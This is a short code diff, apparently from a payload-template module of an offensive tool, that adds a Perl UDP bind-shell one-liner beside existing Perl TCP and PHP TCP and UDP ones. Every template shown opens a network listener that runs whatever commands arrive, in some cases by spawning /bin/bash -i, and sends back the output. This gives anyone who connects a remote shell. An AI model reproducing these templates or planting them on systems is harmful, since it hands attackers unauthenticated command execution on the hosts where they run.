@@ -8,6 +8,8 @@ BIND_PYTHON_UDP = """python -c 'while 1: from subprocess import Popen,PIPE;from 
 
 BIND_PERL_TCP = """perl -e 'use Socket;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""
 
+BIND_PERL_UDP = """perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(LocalPort => "PORT",Proto => "udp");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'"""
+
 BIND_PHP_TCP = """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",PORT);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""
 
 BIND_PHP_UDP = """php -r '$s=socket_create(AF_INET, SOCK_DGRAM, 0);socket_bind($s,"0.0.0.0",PORT);while(1){ socket_recvfrom($s, $buf, 1024, 0, $remote_ip, $remote_port);$d=shell_exec($buf);socket_sendto($s,$d,1024,0,$remote_ip,$remote_port);}'"""
